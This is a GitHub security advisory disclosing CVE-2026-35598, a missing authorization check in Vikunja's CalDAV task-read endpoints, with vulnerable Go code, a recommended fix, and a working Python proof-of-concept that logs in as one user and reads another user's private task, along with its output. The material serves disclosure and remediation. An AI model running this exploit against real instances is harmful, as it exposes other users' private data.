# [M] Vikunja Missing Authorization on CalDAV Task Read

## Summary
Severity: Medium
Advisory: GHSA-48ch-p4gq-x46x
CVE: CVE-2026-35598
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-48ch-p4gq-x46x
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The CalDAV `GetResource` and `GetResourcesByList` methods fetch tasks by UID from the database without verifying that the authenticated user has access to the task's project. Any authenticated CalDAV user who knows (or guesses) a task UID can read the full task data from any project on the instance.

## Details

`GetTasksByUIDs` at `pkg/models/tasks.go:376-393` performs a global database query with no authorization check:

```go
func GetTasksByUIDs(s *xorm.Session, uids []string, a web.Auth) (tasks []*Task, err error) {
    tasks = []*Task{}
    err = s.In("uid", uids).Find(&tasks)
    // ...
}
```

The `web.Auth` parameter is accepted but never used for permission filtering. This function is called by:
- `GetResource` at `pkg/routes/caldav/listStorageProvider.go:266` (CalDAV GET)
- `GetResourcesByList` at `pkg/routes/caldav/listStorageProvider.go:199` (CalDAV REPORT multiget)

All other CalDAV operations enforce authorization: `CreateResource` checks `CanCreate()`, `UpdateResource` checks `CanUpdate()`, `DeleteResource` checks `CanDelete()`. Only the read operations skip authorization.

The project ID in the CalDAV URL is ignored. A request to `/dav/projects/{attacker_project}/{victim_task_uid}.ics` returns the victim's task regardless of which project ID is in the path.

## Proof of Concept

Tested on Vikunja v2.2.2.

```python
import requests
from requests.auth import HTTPBasicAuth

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

def login(u, p):
    return requests.post(f"{API}/login", json={"username": u, "password": p}).json()["token"]

def h(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

alice_token = login("alice", "Alice1234!")
bob_token = login("bob", "Bob12345!")

# alice creates private project and task
proj = requests.put(f"{API}/projects", headers=h(alice_token),
                    json={"title": "Private"}).json()
task = requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h(alice_token),
                    json={"title": "Secret CEO salary 500k"}).json()

# task UID must be set (normally done by CalDAV sync; here via sqlite for PoC)
# sqlite3 vikunja.db "UPDATE tasks SET uid='test-uid-001' WHERE id={task['id']};"
TASK_UID = "test-uid-001"

# bob tries REST API
r = requests.get(f"{API}/tasks/{task['id']}", headers=h(bob_token))
print(f"REST API: {r.status_code}")  # 403

# bob gets CalDAV token
caldav_token = requests.put(f"{API}/user/settings/token/caldav",
    headers=h(bob_token)).json()["token"]

# bob reads alice's task via CalDAV (project ID in URL doesn't matter)
r = requests.get(f"{TARGET}/dav/projects/{proj['id']}/{TASK_UID}.ics",
                 auth=HTTPBasicAuth("bob", caldav_token))
print(f"CalDAV: {r.status_code}")  # 200
print(r.text)  # contains SUMMARY:Secret CEO salary 500k
```

Output:
```
REST API: 403
CalDAV: 200
BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VTODO
UID:test-uid-001
SUMMARY:Secret CEO salary 500k
DUE:20260401T000000Z
END:VTODO
END:VCALENDAR
```

The REST API correctly returns 403, but CalDAV leaks the full task. The project ID in the CalDAV URL is ignored - bob can also use his own project ID and still get alice's task.

## Impact

An authenticated CalDAV user who obtains a task UID (from shared calendar URLs, client sync logs, or enumeration) can read the full task details from any project in the instance, regardless of their access rights. This includes titles, descriptions, due dates, priority, labels, and reminders. In multi-tenant deployments, this exposes data across organizational boundaries.

Task UIDs are UUIDv4 and not trivially enumerable, but they are exposed in CalDAV resource paths, client synchronization logs, and shared calendar contexts.

## Recommended Fix

Add a `CanRead` permission check on each returned task's project in both `GetResource` and `GetResourcesByList`:

```go
tasks, err := models.GetTasksByUIDs(s, []string{vcls.task.UID}, vcls.user)
// ...
for _, t := range tasks {
    project := &models.Project{ID: t.ProjectID}
    can, _, err := project.CanRead(s, vcls.user)
    if err != nil || !can {
        return nil, false, errs.ForbiddenError
    }
}
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-48ch-p4gq-x46x
- https://nvd.nist.gov/vuln/detail/CVE-2026-35598
- https://github.com/go-vikunja/vikunja/pull/2579
- https://github.com/go-vikunja/vikunja/commit/879462d717351fe5d276ddec5246bdec31b41661
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
